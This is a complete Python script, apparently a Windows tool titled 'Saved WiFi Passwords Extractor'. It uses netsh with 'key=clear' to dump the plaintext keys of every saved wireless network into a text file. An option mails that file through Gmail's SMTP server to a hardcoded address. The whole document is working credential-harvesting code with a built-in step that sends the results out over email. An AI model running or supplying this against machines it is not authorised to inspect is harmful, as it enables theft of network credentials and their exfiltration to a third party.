from os import system
import subprocess
import re
import getpass
import smtplib

while True:
    system('cls')
    print("\n\t\t\t\t\t\tSaved WiFi Passwords Extractor\n".center(516,'='))
    print("\n\t\t\t\t\t\tDeveloped By Bhargava Madhav.\n")
    answer = input("\n Please Choose One Of The Following Options: \n\n 0. Exit The Program.\n\n 1. Write The Passwords to a Text File in The Same Directory.\n\n 2. E-mail The Written Passwords as Well.\n\n [>] Enter The Corresponding Number Of Your Choice: ")
    

    def WritePassword():

        username = getpass.getuser()
        file = open('Results.txt', 'w')
        networks = subprocess.check_output("netsh wlan show profile")
        networks = networks.decode('utf-8')
        networks = networks.split("\n")
        networks = networks[9:-2]
        for each in networks:
            networks[networks.index(each)] = each.replace("All User Profile     : ", '')
        for each1 in networks:
            networks[networks.index(each1)] = each1.strip()
        print()
        print(" Found %d Networks On %s\'s PC ".center(100,'=') % (len(networks), username))  
        file.write(" Found %d Networks On %s\'s PC ".center(100,'=') % (len(networks), username))  
        for network in networks:
            results = subprocess.check_output("netsh wlan show profile \"%s\" key=clear" % network)
            results = results.decode('utf-8')
            passRegex = re.compile(r'\s{4}Key Content\s{12}: ((\w|[!"#$%&()*+,./:;<=>?@\\^_`{|}~-]){8,})')
            password1 = passRegex.search(results)
            if password1 != None:
                password = password1.group(1)
                file.write("\n\nThe Password For %s is : %s" % (network, password))
            else:
                file.write("\n\n{} is an open network.".format(network))
        print("\n[+] The Passwords have been successfully written to a text file!")

        file.close()

    def PasswordEmailer():
        try:
            file = open('Results.txt', 'r')
            message = file.read()
            file.close()
            s = smtplib.SMTP("smtp.gmail.com", 587)
            email = "bhargav.madhav005@gmail.com"
            password = getpass.getpass("\n\nPlease Enter The Password For %s: " % email)
            s.starttls()
            s.login(email, password)
            s.sendmail(email, email, message)
            s.quit()
            print("\n\n E-mail has been sent successfully!")
        except:
            print("\n\nE-mail Could Not Be Sent Successfully.")

    if answer == "1":
        system('cls')
        WritePassword()
        input("\n\nPress Enter To Continue.")
    elif answer == "2":
        system('cls')
        WritePassword()
        PasswordEmailer()
        input("\n\nPress Enter To Continue.")
    elif answer == "0":
        print("\nExiting the Program...")
        break
    else:
        input("\n\nInvalid Input. Press Enter to Try Again.")


